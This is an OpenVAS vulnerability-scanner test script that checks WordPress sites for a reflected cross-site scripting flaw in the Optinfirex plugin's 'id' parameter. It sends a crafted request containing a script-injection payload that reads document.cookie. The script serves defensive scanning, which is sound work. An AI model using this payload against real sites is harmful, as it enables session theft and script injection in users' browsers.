###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_optinfirex_plugin_xss_vuln.nasl 6093 2017-05-10 09:03:18Z teissa $
#
# WordPress Optinfirex Plugin Cross Site Scripting Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.903503";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6093 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-05-10 11:03:18 +0200 (Wed, 10 May 2017) $");
  script_tag(name:"creation_date", value:"2013-11-28 11:48:09 +0530 (Thu, 28 Nov 2013)");
  script_name("WordPress Optinfirex Plugin Cross Site Scripting Vulnerability");

  tag_summary =
"This host is installed with WordPress Optinfirex plugin and is prone to
cross site scripting vulnerability.";

  tag_vuldetect =
"Send a crafted HTTP GET request and check whether it is able to read the
cookie or not.";

  tag_insight =
"Flaw is due to improper validation of user-supplied input passed to 'id'
parameter in 'wp-content/plugins/optinfirex/lp/index.php' page.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.

Impact Level: Application";

  tag_affected =
"WordPress Optinfirex Plugin is affected.";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/124188");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/wordpress-optinfirex-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
word_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!word_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:word_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-content/plugins/optinfirex/lp/index.php?'+
            'id="/><script>alert(document.cookie);</script>';

## Check Exploit is working
if(http_vuln_check(port:word_port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\);</script>",
                   extra_check:"Signing Up!<"))
{
  security_message(word_port);
  exit(0);
}
